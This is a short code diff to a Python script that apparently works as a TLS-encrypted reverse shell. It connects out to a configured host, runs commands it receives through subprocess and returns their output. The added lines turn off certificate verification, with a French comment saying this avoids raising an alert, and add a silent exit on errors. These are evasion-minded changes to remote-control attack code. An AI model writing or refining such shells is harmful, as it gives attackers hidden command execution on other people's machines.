@@ -21,10 +21,12 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Wrap the socket in an SSL context
 context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+# certificat autosigné : désactivation des vérifications
+# pour ne pas déclenché d'alerte
 context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
 
-wrappedSocket = context.wrap_socket(sock, server_hostname='localhost')
+wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
 wrappedSocket.connect((HOST, PORT))
 
 try:
@@ -60,5 +62,7 @@ try:
                                        stderr=subprocess.PIPE)
             output, err = command.communicate()
             wrappedSocket.sendall(output)
+except Exception:
+    exit(-1)
 finally:
     wrappedSocket.close()
